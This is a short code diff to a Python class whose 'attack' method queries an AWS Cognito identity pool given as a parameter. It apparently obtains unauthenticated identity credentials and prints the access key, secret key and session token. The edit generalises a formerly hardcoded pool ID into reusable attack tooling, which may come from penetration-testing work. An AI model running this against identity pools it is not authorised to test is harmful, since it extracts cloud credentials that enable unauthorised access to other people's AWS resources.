@@ -7,11 +7,10 @@ import boto3
 class Cognito:
     pass
 
-    def attack(self):
-        client = boto3.client('cognito-identity', region_name="us-east-2")
-
+    def attack(self, ce, region):
+        client = boto3.client('cognito-identity', region_name=region)
         try:
-            _id = client.get_id(IdentityPoolId="us-east-2:242fadac-86fa-4afb-9a48-83a546572559")
+            _id = client.get_id(IdentityPoolId=region + ':' + ce)
         except client.exceptions.NotAuthorizedException as e:
             fail_message = "Bla Bla: {}".format(e)
             print(fail_message)
@@ -25,4 +24,6 @@ class Cognito:
         session_token = credentials['Credentials']['SessionToken']
         identity_id = credentials['IdentityId']
 
-        print(access_key, secret_key, session_token)
+        print("Access key - ", access_key)
+        print("Secret key -", secret_key)
+        print("Session token -", session_token)
